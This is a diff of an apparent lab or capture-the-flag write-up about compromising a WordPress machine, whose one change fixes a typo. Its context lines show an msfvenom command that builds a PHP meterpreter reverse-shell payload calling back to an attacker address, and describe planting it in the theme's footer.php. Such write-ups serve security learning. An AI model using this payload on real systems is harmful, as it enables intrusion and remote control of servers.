@@ -87,7 +87,7 @@ Now it's time for time get a quick reverse shell on the machine. To do this I wi
 
 `msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.17.141 LPORT=4444 -f raw > shell.php`
 
-Note: Meterpreter is not really needed, I could have tried any number of php reverse shells, but I wanted the meterpreter one for the `shell` command so that if I do something to botch my shell I can simply end the session instead of havnig to reconnect entirely.
+Note: Meterpreter is not really needed, I could have tried any number of php reverse shells, but I wanted the meterpreter one for the `shell` command so that if I do something to botch my shell I can simply end the session instead of having to reconnect entirely.
 
 Once the shellcode is generated, I do a little touch up on the format (remove leading `//` and add `?>` to the end), then add to footer.php of the Wordpress theme.
 
